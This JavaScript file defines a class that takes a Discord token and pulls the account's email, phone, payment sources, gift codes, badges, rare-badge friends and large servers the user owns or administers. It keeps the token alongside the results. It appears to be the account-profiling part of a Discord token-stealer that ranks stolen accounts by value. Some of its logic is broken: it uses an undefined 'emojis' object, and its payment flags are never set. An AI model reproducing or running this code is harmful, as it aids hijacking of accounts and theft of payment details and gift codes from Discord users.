"use strict";
const sync_fetch = require("sync-fetch");

module.exports = class DiscordToken {
  constructor(token) {
    const user = this.getDiscordApi("https://discord.com/api/v9/users/@me", token);
    const profile = this.getDiscordApi(`https://discord.com/api/v9/users/${Buffer.from(token.split(".")[0], "base64").toString("binary")}/profile`, token);
    if (!user || user === "Invalid") {
      this.info = { message: "Token not found" };
      this.guilds = { message: "Token not found" };
      this.friends = { message: "Token not found" };
      return;
    }
    const settings = this.getDiscordApi("https://discord.com/api/v9/users/@me/settings", token);
    const paymentSources = this.getDiscordApi("https://discord.com/api/v9/users/@me/billing/payment-sources", token);
    const relationships = this.getDiscordApi("https://discordapp.com/api/v9/users/@me/relationships", token);
    const guilds = this.getDiscordApi("https://discord.com/api/v9/users/@me/guilds?with_counts=true", token);
    const applications = this.getDiscordApi("https://discord.com/api/v9/applications", token);
    const connections = this.getDiscordApi("https://discordapp.com/api/v9/users/@me/connections", token);
    const entitlements = this.getDiscordApi("https://discord.com/api/v8/users/@me/entitlements/gifts", token);

    let creditCard = false;
    let paypal = false;

    let p = "";
    paymentSources?.forEach(s => {
      p += s.brand && s.invalid === 0 ? emojis.user.payments[0] : "";
      p += s.email ? emojis.user.payments[1] : "";
    });

    this.emojis = {
      themes: {
        dark: "Dark",
        light: "Light",
      },
      status: {
        online: "<:online:1129709364316491787>",
        idle: "<:idle:1120542710424674306>",
        dnd: "<:dnd:974692691289993216>",
        invisible: "<:offline:1137141023529762916>",
      },
      user: {
        boost: [
          "<:Booster1Month:1087043238654906472> ",
          "<:Booster2Month:1087043319227494460> ",
          "<:Booster3Month:1087043368250511512> ",
          "<:Booster6Month:1087043493236592820> ",
          "<:Booster9Month:1087043493236592820> ",
          "<:booster12month:1162420359291732038> ",
          "<:Booster15Month:1051453775832961034> ",
          "<:Booster18Month:1051453778127237180> ",
          "<:Booster24Month:1051453776889917530> ",
        ],
        payments: [
          "<a:card:1083014677430284358> ",
          "<:paypal:1129073151746252870> "
        ],
        i: [
          "<:staff:1090015968618623129> ",
          "<:partner:918207395279273985> ",
          "<:events:898186057588277259> ",
          "<:bughunter_1:874750808426692658> ",
          "<:bravery:874750808388952075> ",
          "<:brilliance:874750808338608199> ",
          "<:balance:874750808267292683> ",
          "<:early:944071770506416198> ",
          "<:bughunter_2:874750808430874664> ",
          "<:activedev:1042545590640324608> ",
          "<:verifieddeveloper:898181029737680896> ",
        ]
      },
    }

    this.paymentSources = "";
    this.paymentSources = creditCard ? this.emojis.user.payments[0] : "";
    this.paymentSources += paypal ? this.emojis.user.payments[1] : "None";

    this.info = {
      token: token,
      ID: user.id,
      globalName: `${user.global_name}`,
      avatarDecoration: `${user.avatar_decoration_data ? user.avatar_decoration_data : "None"}`,
      username: `${user.username}#${user.discriminator}`,
      badges: this.AllBadges(user.flags),
      nitroType: this.getNitroPremium(profile),
      avatar: user.avatar ? this.getImage(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`) : "has no avatar",
      banner: user.banner ? this.getImage(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`) : "has no banner",
      totalFriend: relationships.filter((relation) => relation.type === 1).length,
      totalBlocked: relationships.filter((relation) => relation.type === 2).length,
      pending: relationships.filter((relation) => relation.type === 3).length,
      NitroGifts: entitlements[0] ? entitlements.map((gift) => `${gift}, `).join("") : "None",
      totalOwnedGuild: guilds.filter((guild) => guild.owner).length,
      totalApplication: applications.length,
      totalConnection: connections.length,
      totalGuild: guilds.length,
      NSFW: user.nsfw_allowed ? "🔞 `Allowed`" : "❌ `Not allowed`",
      MFA2: user.mfa_enabled ? "✅ `Allowed`" : "❌ `Not allowed`",
      verified: user.verified ? "✅" : "❌",
      bio: user.bio || "has no description",
      phone: user.phone || "has no phone",
      mail: user.email,
      billing: p ? p : "Not Found",
      langue: this.getLanguage(settings.locale),
      status: this.getStatusEmoji(settings.status),
      theme: this.getTheme(settings.theme),
      Gifts: this.getGiftsCodes(token, settings),
      StrangeFriends: this.rareFriend(relationships),
    };

    this.guilds = {
      rares: this.getGuilds(guilds).rare
    };

    this.friends = {
      rares: this.rareFriend(relationships)
    }
  }

  getGuilds(n) {
    let guilds = n;
    let format = (l, x) => l.length ? l.map((s) => x ? `${s.owner ? "<:owner:963333541343686696>" : "<:staff:846569357353680896>"} | **${s.name}** - \`${s.id}\` | **Members** \`${s.member_count}\`` : `${s.owner ? "<:owner:963333541343686696> " : ""}**${s.name}** - \`${s.id}\` | **Members** \`${s.member_count}\``).join("\n") : "Not Found";
    return {
      all: format(guilds.filter((a) => (a.permissions & 2048) === 2048).map((a) => ({ id: a.id, name: a.name, owner: a.owner, member_count: a.approximate_member_count })), false),
      rare: format(guilds.filter((s) => s.owner || (s.permissions & 8) === 8).filter((s) => s.approximate_member_count >= 500).map((s) => ({ id: s.id, name: s.name, owner: s.owner, member_count: s.approximate_member_count })), true),
    };
  };
  getLanguage(locale) {
    const languages = {
      "zh-TW": "🇨🇳 Chinese-Taiwanese",
      "pr-BR": "🇵🇹 Portuguese",
      "sv-SE": "🇸🇪 Swedish",
      "zh-CN": "🇨🇳 Chinese-China",
      "en-GB": "🪟 English (UK)",
      "en-US": "🇺🇸 USA",
      "es-ES": "🇪🇸 Español",
      "ro": "🇷🇴 Romanian",
      "fi": "🇫🇮 Finnish",
      "vi": "🇻🇳 Vietnamese",
      "tr": "🇹🇷 Turkish",
      "ru": "🇷🇺 Russian",
      "uk": "🇺🇦 Ukrainian",
      "hi": "🇮🇳 Indian",
      "th": "🇹🇼 Taiwanese",
      "hr": "🇭🇷 Croatian",
      "it": "🇮🇹 Italianio",
      "lt": "🇱🇹 Lithuanian",
      "no": "🇳🇴 Norwegian",
      "ja": "🇯🇵 Japanese",
      "ko": "🇰🇷 Korean",
      "fr": "🇫🇷 French",
      "da": "🇩🇰 Dansk",
      "de": "🇩🇪 Deutsch",
      "pl": "🇵🇱 Polish",
      "cs": "🇨🇿 Czech",
      "el": "🇬🇷 Greek",
      "bg": "🇧🇬 Bulgarian",
      "hu": "🇳🇴🇭🇺 Hungarian",
    };
    return languages[locale] || "Unknown Language";
  }
  getStatusEmoji(status) {
    return this.emojis.status[status] || "Unknown Status";
  }
  getTheme(theme) {
    return this.emojis.themes[theme] || "Unknown Theme";
  }
  getGiftsCodes(token, settings) {
    const result = [];
    const gifts = this.getDiscordApi(`https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=${settings.locale}`, token);
    gifts?.forEach((gift) => {
      result.push({
        name: gift.promotion.outbound_title,
        code: gift.code,
      });
    });
    return result;
  }
  getImage = (p) => !p ? false : `${p}.${sync_fetch(p).headers.get("content-type").includes("image/gif") ? "gif" : "png"}?size=512`;

  rareFriend(relationships) {
    let result = "";
    const friendRelationships = relationships.filter(
      (relationship) => relationship.type === 1,
    );
    for (const relationship of friendRelationships) {
      const badges = this.rareFriendadges(relationship.user.public_flags);

      if (badges !== "None") {
        result += `${badges} ${relationship.user.username}#${relationship.user.discriminator}\n`;
      }
    }
    return result || "None";
  }
  getDiscordApi(url, token) {
    const res = sync_fetch(url, {
      method: "GET",
      headers: {
        "Content-Type": "application/json",
        Authorization: token
      }
    });
    return res.status === 200 ? res.json() : "Invalid";
  }
  AllBadges(flags) {
    let result = "";
    if (1 & flags) result += this.emojis.user.i[0];
    if (2 & flags) result += this.emojis.user.i[1];
    if (4 & flags) result += this.emojis.user.i[2];
    if (8 & flags) result += this.emojis.user.i[3];
    if (64 & flags) result += this.emojis.user.i[4];
    if (128 & flags) result += this.emojis.user.i[5];
    if (256 & flags) result += this.emojis.user.i[6];
    if (512 & flags) result += this.emojis.user.i[7];
    if (16384 & flags) result += this.emojis.user.i[8];
    if (4194304 & flags) result += this.emojis.user.i[9];
    if (131072 & flags) result += this.emojis.user.i[10];
    return result || ":x:";
  }
  rareFriendadges(flags) {
    let result = "";
    if (1 & flags) result += this.emojis.user.i[0];
    if (2 & flags) result += this.emojis.user.i[1];
    if (4 & flags) result += this.emojis.user.i[2];
    if (8 & flags) result += this.emojis.user.i[3];
    if (512 & flags) result += this.emojis.user.i[7];
    if (16384 & flags) result += this.emojis.user.i[8];
    if (4194304 & flags) result += this.emojis.user.i[9];
    if (131072 & flags) result += this.emojis.user.i[10];
    return result || "None";
  }
  getNitroPremium(user) {
    const { premium_type, premium_guild_since } = user;
    switch (premium_type) {
      default:
        return ":x:";
      case 1:
        return "<:nitro:1016385399020601344>";
      case 2:
        if (!premium_guild_since)
          return "<:nitro:1016385399020601344>";
        const now = new Date();
        const boostDurations = [2, 3, 6, 9, 12, 15, 18, 24];
        let remainingBoosts = 0;
        for (let i = 0; i < boostDurations.length; i++) {
          const duration = boostDurations[i];
          const boostStartDate = new Date(premium_guild_since);
          const boostEndDate = this.getDate(boostStartDate, duration);
          const daysRemaining = Math.round((boostEndDate - now) / 86400000);
          if (daysRemaining > 0) {
            remainingBoosts = i;
            break;
          }
        }
        return `<:nitro:1016385399020601344> ${this.emojis.user.boost[remainingBoosts]}`;
    }
  }
  getDate(s, m) {
    const e = new Date(s);
    e.setMonth(s.getMonth() + m);
    return e;
  }
}
